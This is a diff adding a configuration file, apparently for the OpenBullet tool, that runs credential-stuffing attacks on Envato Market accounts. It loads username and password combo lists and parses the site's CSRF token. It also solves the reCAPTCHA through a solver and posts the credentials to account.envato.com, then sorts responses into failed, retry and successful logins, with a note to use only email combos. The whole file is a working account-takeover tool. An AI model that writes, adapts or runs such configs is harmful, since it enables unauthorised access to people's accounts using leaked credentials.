@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "Envato Market",
+  "SuggestedBots": 10,
+  "LastModified": "2018-05-07T13:52:02.0040367+00:00",
+  "AdditionalInfo": "Device locks accounts. Use only email access combos.",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "https://account.envato.com/sign_in?to=envatomarket" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_CSRF PARSE "<SOURCE>" CSS "[name=csrf-token]" "content" 0 -> VAR "CSRF" "" "" 
+RECAPTCHA "https://account.envato.com/sign_in?to=envatomarket" "6Lcl9EwUAAAAACOzikfNI9wU01lH129hNipn6MKQ" -> VAR "RECAP" 
+#LOGIN REQUEST POST "https://account.envato.com/sign_in" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&to=envatomarket&state=&g-recaptcha-response=<RECAP>&recaptcha_site_key=6Lcl9EwUAAAAACOzikfNI9wU01lH129hNipn6MKQ&recaptcha_version=2" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "x-csrf-token: <CSRF>" 
+  HEADER "referer: https://account.envato.com/sign_in?to=envatomarket" 
+  HEADER "origin: https://account.envato.com" 
+  HEADER "x-newrelic-id: VQcGQldWDAcIUFY=" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Looks like these are not your correct details" 
+    KEY "Username can't be blank and Password can't be blank" 
+  KEYCHAIN Retry OR 
+    KEY "Invalid Recaptcha response" 
+  KEYCHAIN Success OR 
+    KEY "sign_in_verification_token" 
